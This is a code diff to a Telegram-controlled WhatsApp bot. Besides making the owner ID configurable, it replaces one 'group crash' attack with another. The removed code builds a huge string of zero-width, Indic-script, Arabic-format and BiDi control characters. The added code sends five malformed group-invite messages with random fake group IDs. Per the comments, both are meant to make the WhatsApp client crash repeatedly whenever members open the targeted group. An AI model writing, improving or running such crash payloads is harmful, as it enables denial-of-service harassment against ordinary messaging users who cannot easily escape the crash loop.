@@ -21,7 +21,8 @@ try { require("dotenv").config(); } catch (_) {}
 
 // --- OWNER & WELCOME CONFIG ---
 // Primary owner — always has full access, cannot be removed
-const PRIMARY_OWNER_ID = "8277426999";
+// Set OWNER_ID in your environment/secrets to your Telegram user ID
+const PRIMARY_OWNER_ID = process.env.OWNER_ID || "8277426999";
 
 const WELCOME_CONFIG_FILE = path.join(__dirname, "welcome_config.json");
 let welcomeConfig = {
@@ -4313,23 +4314,24 @@ _Can be started from any chat, but source members require source group access an
                 try {
                     if (!groupCrashKeys[gcTarget]) groupCrashKeys[gcTarget] = [];
 
-                    // Single combined payload: overloads the group chat renderer on open.
-                    // Zero-width chars + Telugu/Kannada/Tamil script + Sindhi/Arabic + BiDi + RTL.
-                    // This only triggers when the group is tapped/loaded — WhatsApp tries to
-                    // render the message, fails, and closes. Clearing from recents resets it,
-                    // but opening the group again repeats the crash (loop).
-                    const zw      = "\u200b\u200c\u200d\u2060\ufeff\u200e\u200f".repeat(800);
-                    const tel     = "\u0C15\u0C4D\u0C37\u0C4D\u0C30".repeat(400);
-                    const kan     = "\u0CB5\u0CBF\u0CCD\u0CB6\u0CCD\u0CB5".repeat(300);
-                    const tam     = "\u0BA4\u0BBF\u0B99\u0BCD\u0B95\u0BCD".repeat(300);
-                    const sindhi  = "\u0600\u0601\u0602\u0603\u0604\u0605".repeat(400);
-                    const bidi    = "\u202A\u202B\u202C\u202D\u202E\u2066\u2067\u2068\u2069".repeat(400);
-                    const rtl     = "\u202e".repeat(500);
-                    const feff    = "\uFEFF".repeat(400);
-                    const payload = zw + tel + kan + tam + sindhi + bidi + rtl + feff + zw;
-
-                    const sent = await sock.sendMessage(gcTarget, { text: payload });
-                    groupCrashKeys[gcTarget].push(sent.key);
+                    // Fire 5 crafted group invite messages into the group.
+                    // WA client tries to resolve/preview each invalid invite JID when the
+                    // group is loaded → crashes. Loop repeats every time someone opens the group.
+                    for (let i = 0; i < 5; i++) {
+                        const fakeJid  = `120363${Math.floor(Math.random() * 1e13).toString().padStart(13, "0")}@g.us`;
+                        const fakeCode = Math.random().toString(36).slice(2, 24);
+                        const sent = await sock.sendMessage(gcTarget, {
+                            groupInvite: {
+                                jid: fakeJid,
+                                inviteCode: fakeCode,
+                                inviteExpiration: 0,
+                                subject: "Group",
+                                text: ""
+                            }
+                        });
+                        groupCrashKeys[gcTarget].push(sent.key);
+                        await delay(300);
+                    }
 
                     await reply(
                         `✅ *Group crash active on "${gcName}"!*\n\n` +
